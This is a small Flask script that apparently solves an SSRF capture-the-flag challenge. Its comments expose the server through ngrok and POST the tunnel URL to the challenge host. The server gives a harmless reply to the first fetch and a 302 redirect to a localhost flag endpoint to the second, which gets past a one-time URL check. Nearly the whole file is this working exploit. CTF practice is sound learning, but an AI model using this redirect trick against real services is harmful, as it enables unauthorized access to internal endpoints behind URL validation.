from flask import Flask, redirect, request

# flask run
# ngrok http 5000
# curl -X POST -d "url=http://c0ac-81-103-153-174.ngrok.io/exploit" http://ssrf.chall.seetf.sg:1337/

app = Flask(__name__)
check = True


@app.route("/")
def index():
    return "<a href='https://www.youtube.com/c/CryptoCat23'>👀</a>"


@app.route("/exploit", methods=['GET', 'POST'])
def handle():
    global check
    if check:  # First request = benign
        check = False
        return "First request is benign, why wouldn't the second be?!"
    else:  # Second request = malicious
        check = True
        return redirect("http://127.0.0.1/flag", code=302)
